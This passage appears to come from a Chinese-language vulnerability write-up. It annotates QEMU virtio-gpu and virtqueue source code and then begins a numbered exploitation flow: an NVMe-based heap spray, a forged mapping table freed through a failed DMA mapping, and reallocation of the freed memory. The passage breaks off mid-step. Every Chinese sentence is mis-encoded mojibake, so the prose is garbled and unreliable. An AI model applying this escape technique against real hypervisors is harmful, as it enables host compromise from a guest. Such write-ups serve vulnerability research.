class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">virtqueue_split_pop</span><span class="hljs-params">(VirtQueue *vq, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, head, max;<br>    VRingMemoryRegionCaches *caches;<br>    MemoryRegionCache indirect_desc_cache = MEMORY_REGION_CACHE_INVALID;<br>    MemoryRegionCache *desc_cache;<br>    <span class="hljs-type">int64_t</span> len;<br>    VirtIODevice *vdev = vq-&gt;vdev;<br>    VirtQueueElement *elem = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">unsigned</span> out_num, in_num, elem_entries;<br>    hwaddr addr[VIRTQUEUE_MAX_SIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span>[<span class="hljs-title">VIRTQUEUE_MAX_SIZE</span>];</span><br>    VRingDesc desc;<br>    <span class="hljs-type">int</span> rc;<br><br>    RCU_READ_LOCK_GUARD();<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    virtio_queue_empty_rcuå‡½æ•°åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼Œ å‡½æ•°å…·ä½“åˆ¤æ–­vq-&gt;shadow_avail_idxå’Œvq-&gt;last_avail_idxæ˜¯å¦ç›¸ç­‰ï¼Œ</span><br><span class="hljs-comment">    ä¸ç›¸ç­‰è¿”å›0ï¼›å¦‚æœç›¸ç­‰ï¼Œç»§ç»­ä½¿ç”¨vring_avail_idxå‡½æ•°æ›´æ–°shadow_avail_idxçš„å€¼ï¼Œä¸ç›¸ç­‰è¿”å›0ï¼Œç›¸ç­‰è¿”å›1ã€‚</span><br><span class="hljs-comment">    shadow_avail_idxçš„å€¼æ˜¯ä»(vq-&gt;vring-&gt;avail + offsetof(VRingAvail, idx))è™šæ‹Ÿæœºç‰©ç†åœ°å€ä¸­è·å–ã€‚</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (virtio_queue_empty_rcu(vq)) &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br>    <span class="hljs-comment">/* Needed after virtio_queue_empty(), see comment in</span><br><span class="hljs-comment">     * virtqueue_num_heads(). */</span><br>    smp_rmb();<br><br>    <span class="hljs-comment">/* When we start there are none of either input nor output. */</span><br>    out_num = in_num = elem_entries = <span class="hljs-number">0</span>;<br><br>    max = vq-&gt;vring.num;<br><br>    <span class="hljs-keyword">if</span> (vq-&gt;inuse &gt;= vq-&gt;vring.num) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Virtqueue size exceeded&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">virtqueue_get_headå‡½æ•°è·å–é˜Ÿåˆ—çš„å¤´éƒ¨å¼•ç´¢å€¼ï¼Œheadçš„å€¼ä»(vq-&gt;vring-&gt;avail + offsetof(VRingAvail, ring[vq-&gt;last_avail_idx]))</span><br><span class="hljs-comment">è™šæ‹Ÿæœºç‰©ç†åœ°å€ä¸­è·å–</span><br><span class="hljs-comment">*/</span><br>    <span class="hljs-keyword">if</span> (!virtqueue_get_head(vq, vq-&gt;last_avail_idx++, &amp;head)) &#123;<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (virtio_vdev_has_feature(vdev, VIRTIO_RING_F_EVENT_IDX)) &#123;<br>        vring_set_avail_event(vq, vq-&gt;last_avail_idx);<br>    &#125;<br><span class="hljs-comment">//æ›´æ–°i</span><br>    i = head;<br><span class="hljs-comment">//è·å–cachesä¿¡æ¯</span><br>    caches = vring_get_region_caches(vq);<br>    <span class="hljs-keyword">if</span> (!caches) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Region caches not initialized&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (caches-&gt;desc.len &lt; max * <span class="hljs-keyword">sizeof</span>(VRingDesc)) &#123;<br>        virtio_error(vdev, <span class="hljs-string">&quot;Cannot map descriptor ring&quot;</span>);<br>        <span class="hljs-keyword">goto</span> done;<br>    &#125;<br><br>    desc_cache = &amp;caches-&gt;desc;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    vring_split_desc_readå‡½æ•°å°†(vq-&gt;vring-&gt;desc +  i * sizeof(VRingDesc))è™šæ‹Ÿæœºç‰©ç†åœ°å€ä¸­</span><br><span class="hljs-comment">    çš„VRingDescç»“æ„ä½“èµ‹å€¼ç»™desc</span><br><span class="hljs-comment">    */</span><br>    vring_split_desc_read(vdev, &amp;desc, desc_cache, i);<br>    <span class="hljs-keyword">if</span> (desc.flags &amp; VRING_DESC_F_INDIRECT) &#123;<br>        <span class="hljs-keyword">if</span> (!desc.len || (desc.len % <span class="hljs-keyword">sizeof</span>(VRingDesc))) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Invalid size for indirect buffer table&quot;</span>);<br>            <span class="hljs-keyword">goto</span> done;<br>        &#125;<br><br>        <span class="hljs-comment">/* loop over the indirect descriptor table */</span><br>        len = address_space_cache_init(&amp;indirect_desc_cache, vdev-&gt;dma_as,<br>                                       desc.addr, desc.len, <span class="hljs-literal">false</span>);<br>        desc_cache = &amp;indirect_desc_cache;<br>        <span class="hljs-keyword">if</span> (len &lt; desc.len) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Cannot map indirect buffer&quot;</span>);<br>            <span class="hljs-keyword">goto</span> done;<br>        &#125;<br><br>        max = desc.len / <span class="hljs-keyword">sizeof</span>(VRingDesc);<br>        i = <span class="hljs-number">0</span>;<br>        vring_split_desc_read(vdev, &amp;desc, desc_cache, i);<br>    &#125;<br><br>    <span class="hljs-comment">/* Collect all the descriptors */</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-type">bool</span> map_ok;<br><br>        <span class="hljs-keyword">if</span> (desc.flags &amp; VRING_DESC_F_WRITE) &#123;<br>            map_ok = virtqueue_map_desc(vdev, &amp;in_num, addr + out_num,<br>                                        iov + out_num,<br>                                        VIRTQUEUE_MAX_SIZE - out_num, <span class="hljs-literal">true</span>,<br>                                        desc.addr, desc.len);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (in_num) &#123;<br>                virtio_error(vdev, <span class="hljs-string">&quot;Incorrect order for descriptors&quot;</span>);<br>                <span class="hljs-keyword">goto</span> err_undo_map;<br>            &#125;<br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            virtqueue_map_descå‡½æ•°çš„æ•ˆæœå¦‚ä¸‹:</span><br><span class="hljs-comment">            iov[out_num].iov_base = dma_memory_mapå‡½æ•°æ˜ å°„desc.addråœ°å€åçš„å€¼</span><br><span class="hljs-comment">            iov[out_num].iov_len = desc.len</span><br><span class="hljs-comment">            out_num ++</span><br><span class="hljs-comment">            */</span><br>            map_ok = virtqueue_map_desc(vdev, &amp;out_num, addr, iov,<br>                                        VIRTQUEUE_MAX_SIZE, <span class="hljs-literal">false</span>,<br>                                        desc.addr, desc.len);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!map_ok) &#123;<br>            <span class="hljs-keyword">goto</span> err_undo_map;<br>        &#125;<br><br>        <span class="hljs-comment">/* If we&#x27;ve got too many, that implies a descriptor loop. */</span><br>        <span class="hljs-keyword">if</span> (++elem_entries &gt; max) &#123;<br>            virtio_error(vdev, <span class="hljs-string">&quot;Looped descriptor&quot;</span>);<br>            <span class="hljs-keyword">goto</span> err_undo_map;<br>        &#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">virtqueue_split_read_next_descå‡½æ•°çš„ä½œç”¨ä¸ºï¼šåˆ¤æ–­desc.flagæ ‡å¿—ï¼Œi = desc-&gt;nextï¼Œ</span><br><span class="hljs-comment">ä½¿ç”¨vring_split_desc_readè·å–ä¸‹ä¸€ä¸ªVRingDescç»“æ„ä½“</span><br><span class="hljs-comment">*/</span><br>        rc = virtqueue_split_read_next_desc(vdev, &amp;desc, desc_cache, max, &amp;i);<br>    &#125; <span class="hljs-keyword">while</span> (rc == VIRTQUEUE_READ_DESC_MORE);<br><br>    <span class="hljs-keyword">if</span> (rc == VIRTQUEUE_READ_DESC_ERROR) &#123;<br>        <span class="hljs-keyword">goto</span> err_undo_map;<br>    &#125;<br><br>    <span class="hljs-comment">/* Now copy what we have collected and mapped */</span><br>    elem = virtqueue_alloc_element(sz, out_num, in_num);<br>    elem-&gt;index = head;<br>    elem-&gt;ndescs = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; out_num; i++) &#123;<br>        elem-&gt;out_addr[i] = addr[i];<br>        elem-&gt;out_sg[i] = iov[i];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; in_num; i++) &#123;<br>        elem-&gt;in_addr[i] = addr[out_num + i];<br>        elem-&gt;in_sg[i] = iov[out_num + i];<br>    &#125;<br><br>    vq-&gt;inuse++;<br><br>    trace_virtqueue_pop(vq, elem, elem-&gt;in_num, elem-&gt;out_num);<br>done:<br>    address_space_cache_destroy(&amp;indirect_desc_cache);<br><br>    <span class="hljs-keyword">return</span> elem;<br><br>err_undo_map:<br>    virtqueue_undo_map_desc(out_num, in_num, iov);<br>    <span class="hljs-keyword">goto</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><p>â€‹                                          </p><p>å–å¾—cmdåè¿›å…¥virtio_gpu_simple_process_cmdï¼Œé¦–å…ˆå°±æ˜¯è°ƒç”¨VIRTIO_GPU_FILL_CMDï¼Œè¿™ä¸ªå®å®é™…ä¸Šå°±æ˜¯å°†ä¸Šé¢virtqueue_split_popå‡½æ•°ä¸­ç¬¬ä¸€ä¸ªVirtIODeviceç»“æ„ä½“çš„addrä¸­çš„å€¼æ‹·è´åˆ°cmd-&gt;cmd_hdrï¼Œç„¶åé€šè¿‡switchè¿›å…¥ç›¸åº”çš„åŠŸèƒ½</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_GPU_FILL_CMD(out) do &#123;                                   \</span><br><span class="hljs-meta">        size_t s;                                                       \</span><br><span class="hljs-meta">        s = iov_to_buf(cmd-&gt;elem.out_sg, cmd-&gt;elem.out_num, 0,          \</span><br><span class="hljs-meta">                       &amp;out, sizeof(out));                              \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (s != sizeof(out)) &#123;                                         \</span><br><span class="hljs-meta">            qemu_log_mask(LOG_GUEST_ERROR,                              \</span><br><span class="hljs-meta">                          <span class="hljs-string">&quot;%s: command size incorrect %zu vs %zu\n&quot;</span>,    \</span><br><span class="hljs-meta">                          __func__, s, sizeof(out));                    \</span><br><span class="hljs-meta">            return;                                                     \</span><br><span class="hljs-meta">        &#125;                                                               \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_simple_process_cmd</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                          <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>    VIRTIO_GPU_FILL_CMD(cmd-&gt;cmd_hdr);<br>    virtio_gpu_ctrl_hdr_bswap(&amp;cmd-&gt;cmd_hdr);<br><br>    <span class="hljs-keyword">switch</span> (cmd-&gt;cmd_hdr.type) &#123;<br><br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br><br>    <span class="hljs-keyword">case</span> VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING:<br>        virtio_gpu_resource_attach_backing(g, cmd);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING:<br>        virtio_gpu_resource_detach_backing(g, cmd);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!cmd-&gt;finished) &#123;<br>        virtio_gpu_ctrl_response_nodata(g, cmd, cmd-&gt;error ? cmd-&gt;error :<br>                                        VIRTIO_GPU_RESP_OK_NODATA);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>virtio_gpu_resource_attach_backingå‡½æ•°ä¸­è¦é¡ºåˆ©è°ƒç”¨virtio_gpu_create_mapping_iovï¼Œè¿˜è¦<code>virtio_gpu_find_resource(g, ab.resource_id)</code>è¿”å›çš„virtio_gpu_simple_resourceç»“æ„ä½“æ»¡è¶³ä¸€äº›æ¡ä»¶ï¼Œæ‰€ä»¥äº‹å…ˆè°ƒç”¨virtio_gpu_resource_create_2då‡½æ•°åˆ›å»ºä¸€ä¸ªvirtio_gpu_simple_resourceç»“æ„ä½“ï¼Œé€šè¿‡ab.resource_idæ‰¾åˆ°ç›¸åº”çš„virtio_gpu_simple_resourceç»“æ„ä½“ï¼Œä¹‹åå°±èƒ½è¿›å…¥virtio_gpu_create_mapping_iovå‡½æ•°äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">virtio_gpu_resource_attach_backing</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                   <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_simple_resource</span> *<span class="hljs-title">res</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_resource_attach_backing</span> <span class="hljs-title">ab</span>;</span><br>    <span class="hljs-type">int</span> ret;<br><br>    VIRTIO_GPU_FILL_CMD(ab);<br>    virtio_gpu_bswap_32(&amp;ab, <span class="hljs-keyword">sizeof</span>(ab));<br>    trace_virtio_gpu_cmd_res_back_attach(ab.resource_id);<br><br>    res = virtio_gpu_find_resource(g, ab.resource_id);<br>    <span class="hljs-keyword">if</span> (!res) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: illegal resource specified %d\n&quot;</span>,<br>                      __func__, ab.resource_id);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (res-&gt;iov) &#123;<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    ret = virtio_gpu_create_mapping_iov(g, &amp;ab, cmd, &amp;res-&gt;addrs, &amp;res-&gt;iov);<br>    <span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_UNSPEC;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res-&gt;iov_cnt = ab.nr_entries;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_resource_create_2d</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                          <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd)</span><br>&#123;<br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br>    <br>    <span class="hljs-keyword">if</span> (c2d.resource_id == <span class="hljs-number">0</span>) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: resource id 0 is not allowed\n&quot;</span>,<br>                      __func__);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res = virtio_gpu_find_resource(g, c2d.resource_id);<br>    <span class="hljs-keyword">if</span> (res) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: resource already exists %d\n&quot;</span>,<br>                      __func__, c2d.resource_id);<br>        cmd-&gt;error = VIRTIO_GPU_RESP_ERR_INVALID_RESOURCE_ID;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    res = g_new0(<span class="hljs-keyword">struct</span> virtio_gpu_simple_resource, <span class="hljs-number">1</span>);<br><br>    res-&gt;width = c2d.width;<br>    res-&gt;height = c2d.height;<br>    res-&gt;format = c2d.format;<br>    res-&gt;resource_id = c2d.resource_id;<br><br>â€¦â€¦â€¦â€¦â€¦â€¦<br>    â€¦â€¦â€¦â€¦â€¦â€¦<br><br>    QTAILQ_INSERT_HEAD(&amp;g-&gt;reslist, res, next);<br>    g-&gt;hostmem += res-&gt;hostmem;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥virtio_gpu_create_mapping_iovå‡½æ•°åå°±å¯ä»¥å®Œæˆmapping tableçš„è®¾ç½®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">virtio_gpu_create_mapping_iov</span><span class="hljs-params">(VirtIOGPU *g,</span><br><span class="hljs-params">                                  <span class="hljs-keyword">struct</span> virtio_gpu_resource_attach_backing *ab,</span><br><span class="hljs-params">                                  <span class="hljs-keyword">struct</span> virtio_gpu_ctrl_command *cmd,</span><br><span class="hljs-params">                                  <span class="hljs-type">uint64_t</span> **addr, <span class="hljs-keyword">struct</span> iovec **iov)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_gpu_mem_entry</span> *<span class="hljs-title">ents</span>;</span><br>    <span class="hljs-type">size_t</span> esize, s;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">if</span> (ab-&gt;nr_entries &gt; <span class="hljs-number">16384</span>) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR,<br>                      <span class="hljs-string">&quot;%s: nr_entries is too big (%d &gt; 16384)\n&quot;</span>,<br>                      __func__, ab-&gt;nr_entries);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    esize = <span class="hljs-keyword">sizeof</span>(*ents) * ab-&gt;nr_entries;<br>    ents = g_malloc(esize);<br>    s = iov_to_buf(cmd-&gt;elem.out_sg, cmd-&gt;elem.out_num,<br>                   <span class="hljs-keyword">sizeof</span>(*ab), ents, esize);<br>    <span class="hljs-keyword">if</span> (s != esize) &#123;<br>        qemu_log_mask(LOG_GUEST_ERROR,<br>                      <span class="hljs-string">&quot;%s: command data size incorrect %zu vs %zu\n&quot;</span>,<br>                      __func__, s, esize);<br>        g_free(ents);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>    *iov = g_malloc0(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> iovec) * ab-&gt;nr_entries);<br>    <span class="hljs-keyword">if</span> (addr) &#123;<br>        *addr = g_malloc0(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) * ab-&gt;nr_entries);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ab-&gt;nr_entries; i++) &#123;<br>        <span class="hljs-type">uint64_t</span> a = le64_to_cpu(ents[i].addr);<br>        <span class="hljs-type">uint32_t</span> l = le32_to_cpu(ents[i].length);<br>        hwaddr len = l;<br>        (*iov)[i].iov_len = l;<br>        (*iov)[i].iov_base = dma_memory_map(VIRTIO_DEVICE(g)-&gt;dma_as,<br>                                            a, &amp;len, DMA_DIRECTION_TO_DEVICE);<br>        <span class="hljs-keyword">if</span> (addr) &#123;<br>            (*addr)[i] = a;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!(*iov)[i].iov_base || len != l) &#123;<br>            qemu_log_mask(LOG_GUEST_ERROR, <span class="hljs-string">&quot;%s: failed to map MMIO memory for&quot;</span><br>                          <span class="hljs-string">&quot; resource %d element %d\n&quot;</span>,<br>                          __func__, ab-&gt;resource_id, i);<br>            virtio_gpu_cleanup_mapping_iov(g, *iov, i);<br>            g_free(ents);<br>            *iov = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">if</span> (addr) &#123;<br>                g_free(*addr);<br>                *addr = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    g_free(ents);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å…·ä½“åˆ©ç”¨æµç¨‹"><a href="#å…·ä½“åˆ©ç”¨æµç¨‹" class="headerlink" title="å…·ä½“åˆ©ç”¨æµç¨‹"></a>å…·ä½“åˆ©ç”¨æµç¨‹</h2><ol><li>åˆ©ç”¨nvme_create_cqæˆ–è€…nvme_create_sqä¸­çš„mallocåŸè¯­æ¥å®ç°å †å–·ï¼Œè·å¾—ç¨³å®šå †ç©ºé—´çš„å¸ƒå±€ã€‚</li><li>æ„é€ mapping tableï¼Œè®¾ç½®å¥½qsg-&gt;sgçš„å€¼æ˜¯dma_memory_mapåçš„åœ°å€ï¼Œåœ¨åé¢é‡Šæ”¾è¿™ä¸ªåœ°å€æ—¶åœ¨qemu_sglist_destroyå‡½æ•°ä¸­æœ‰<code>object_unref(OBJECT(qsg-&gt;dev))</code>ï¼Œéœ€è¦é€šè¿‡è¿™ä¸ªå‡½æ•°é‡Œçš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¿˜éœ€è¦è®¾ç½®qsg-&gt;devçš„å€¼æ˜¯0ã€‚</li><li>æ„é€ å®Œä»¥åè¿˜éœ€è¦é‡Šæ”¾ï¼Œè¿™é‡Œç›´æ¥è®©dma_memory_mapä¸­çš„<code>len</code> ä¸º0ï¼Œå‡½æ•°çš„è¿”å›å€¼å°±æ˜¯0ï¼Œ é€šè¿‡ <code>if (!(*iov)[i].iov_base || len != l)</code>è¿™ä¸ªåˆ¤æ–­åç›´æ¥è°ƒç”¨virtio_gpu_cleanup_mapping_iovå‡½æ•°é‡Šæ”¾ã€‚</li><li>åˆ›å»ºä¸€ä¸ªsq ï¼Œåœ¨nvme_init_sqå‡½æ•°ä¸­æœ‰<code>sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size)</code>ï¼Œç”³è¯·å 